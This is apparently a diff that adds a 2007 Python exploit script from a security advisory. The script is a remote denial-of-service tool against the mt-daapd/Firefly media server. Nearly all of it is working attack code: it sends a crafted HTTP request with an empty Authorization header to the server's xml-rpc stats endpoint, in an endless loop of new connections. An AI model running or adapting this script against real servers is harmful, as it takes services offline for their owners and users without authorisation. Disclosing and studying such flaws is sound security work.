@@ -1,0 +1,38 @@
+#!C:\python25\python25.exe
+
+"""
+Advisory : [UPH-07-02]
+mt-dappd/Firefly media server remote DoS
+Discovered by nnp
+http://www.unprotectedhex.com
+"""
+
+import sys
+import socket
+import time
+
+if len(sys.argv) != 3:
+    sys.exit(-1)
+
+kill_msg = """GET /xml-rpc?method=stats HTTP/1.1\r\n 
+Authorization:\r\n\r\n"""
+
+host = sys.argv[1]
+port = sys.argv[2]
+
+print '[+] Host : ' + host
+print '[+] Port : ' + port
+
+print "[+] Sending "
+print kill_msg
+
+ctr = 1
+while 1:
+    print '[+] Ctr : ' + str(ctr)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, int(port)))
+    s.send(kill_msg)
+    s.close()
+    ctr += 1
+
+# milw0rm.com [2007-11-02]
